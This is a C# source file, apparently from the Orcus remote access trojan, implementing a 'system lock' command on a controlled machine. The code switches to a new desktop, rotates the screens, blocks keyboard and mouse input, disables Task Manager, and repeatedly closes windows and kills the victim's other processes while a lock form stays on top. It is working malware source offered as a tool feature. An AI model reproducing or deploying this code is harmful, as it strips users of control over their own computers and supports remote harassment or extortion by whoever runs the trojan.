using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Orcus.Commands.FunActions;
using Orcus.Native;
using Orcus.Native.Display;
using Orcus.Plugins;
using Orcus.Plugins.StaticCommands;
using Orcus.StaticCommands.System;
using Orcus.StaticCommands.SystemLock;
using Orcus.Utilities;
using Orcus.Utilities.WindowsDesktop;
using Timer = System.Threading.Timer;

namespace Orcus.StaticCommands
{
    public class SystemLockCommandEx : SystemLockCommand
    {
        private Desktop _desktop;
        private Timer _closeWindowsTimer;
        private readonly TimeSpan _closeWindowsInterval = TimeSpan.FromSeconds(1);
        private SystemLockForm _lockForm;

        public override void StartExecute(CommandParameter commandParameter, IClientInfo clientInfo)
        {
            commandParameter.InitializeProperties(this);

            if (UseDifferentDesktop)
            {
                _desktop = Desktop.CreateDesktop(Guid.NewGuid().ToString("N"));
                _desktop.Show();
                Desktop.SetCurrent(_desktop);

                if (CloseOtherWindows)
                    _closeWindowsTimer = new Timer(CloseWindowsCallback, null, _closeWindowsInterval,
                        TimeoutEx.InfiniteTimeSpan);
            }

            if (RotateScreen)
            {
                var result = Display.RotateAllScreens(Display.Orientations.DEGREES_CW_180);
                if (result != DISP_CHANGE.Successful)
                {
                    Display.ResetAllRotations();
                    RotateScreen = false;
                }
            }

            _lockForm = new SystemLockForm(Message, PreventClosing, Background, SetToTopPeriodically,
                RotateScreen);

            if (DisableUserInput)
                NativeMethods.BlockInput(true);

            if (Topmost)
                _lockForm.TopMost = true;

            if (DisableTaskManager)
                try
                {
                    WindowsModules.SetTaskManager(false);
                }
                catch (Exception)
                {
                    // ignored
                }

            try
            {
                _lockForm.ShowDialog();
            }
            finally
            {
                if (RotateScreen)
                    Display.ResetAllRotations();

                if (DisableUserInput)
                    NativeMethods.BlockInput(false);

                if (DisableTaskManager)
                    try
                    {
                        WindowsModules.SetTaskManager(true);
                    }
                    catch (Exception)
                    {
                        // ignored
                    }

                if (_closeWindowsTimer != null)
                {
                    var closeTimer = _closeWindowsTimer;
                    _closeWindowsTimer = null;
                    closeTimer.Dispose();
                }

                if (UseDifferentDesktop)
                {
                    Desktop.Default.Show();
                    _desktop.Dispose();
                }
            }
        }

        public override void StopExecute()
        {
            base.StopExecute();
            _lockForm?.SafeClose();
        }

        private void CloseWindowsCallback(object state)
        {
            Desktop.SetCurrent(_desktop);
            try
            {
                var windows = _desktop.GetWindows();
                var processId = Process.GetCurrentProcess().Id;

                foreach (var window in windows)
                {
                    uint windowPid;
                    NativeMethods.GetWindowThreadProcessId(window.Handle, out windowPid);
                    if (windowPid != processId)
                    {
                        NativeMethods.PostMessage(new HandleRef(null, window.Handle), WM.CLOSE, IntPtr.Zero, IntPtr.Zero);
                        try
                        {
                            var process = Process.GetProcessById((int) windowPid);
                            process.Kill();
                        }
                        catch (Exception)
                        {
                            // ignored
                        }
                    }
                }
                
            }
            catch (Exception)
            {
                // ignored
            }

            if (IsActive)
                _closeWindowsTimer?.Change(_closeWindowsInterval, TimeoutEx.InfiniteTimeSpan);
        }
    }
}